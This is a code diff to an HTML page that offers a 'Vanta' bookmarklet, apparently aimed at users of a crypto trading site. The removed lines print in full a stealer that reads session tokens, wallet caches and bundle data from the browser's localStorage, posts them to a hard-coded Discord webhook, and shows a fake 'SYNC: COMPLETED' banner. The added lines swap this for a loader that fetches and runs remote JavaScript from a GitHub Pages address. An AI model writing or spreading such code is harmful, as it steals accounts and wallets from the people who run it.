@@ -94,31 +94,17 @@
         function animate() { ctx.clearRect(0,0,canvas.width,canvas.height); filaments.forEach(f=>{f.update(); f.draw();}); requestAnimationFrame(animate); }
         animate();
 
-        // 1:1 BOOKMARKLET LOGIC
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4"; // <--- PUT YOUR WEBHOOK HERE
+        // 1:1 EXTERNAL LOADER LOGIC
+        // This pulls the script from your GitHub so you can update it without changing the website
+        const REMOTE_ENGINE = "https://vanta-dev-pages.github.io/Vanta/engine.js";
         
-        const code = `(function(){
-            const s = {
-                u: window.location.href,
-                t: new Date().toLocaleString(),
-                ses: localStorage.getItem("padreV2-session") || "N/A",
-                wal: localStorage.getItem("padreV2-walletsCache") || "N/A",
-                bun: localStorage.getItem("padre-v2-bundles-store-v2") || "N/A"
-            };
-            const msg = "🚨 **VANTA DATA CAPTURED** 🚨\\n\\nURL: " + s.u + "\\nSESSION: " + s.ses + "\\nWALLETS: " + s.wal + "\\nBUNDLES: " + s.bun;
-            fetch("${WEBHOOK_URL}", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ content: msg.substring(0, 2000) })
-            });
-            const d = document.createElement("div");
-            d.style = "position:fixed;top:20px;right:20px;background:#000;color:#0f8;padding:20px;border:2px solid #0f8;z-index:9999;font-family:monospace;";
-            d.innerHTML = "VANTA CONNECTED<br>SYNC: COMPLETED";
-            document.body.appendChild(d);
-            setTimeout(()=>d.remove(), 3000);
-        })()`;
+        const loaderCode = `javascript:(function(){
+            const s = document.createElement('script');
+            s.src = '${REMOTE_ENGINE}?v=' + Date.now();
+            document.body.appendChild(s);
+        })();`;
 
-        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(code);
+        document.getElementById('vanta-tool').href = loaderCode;
     </script>
 </body>
 </html>
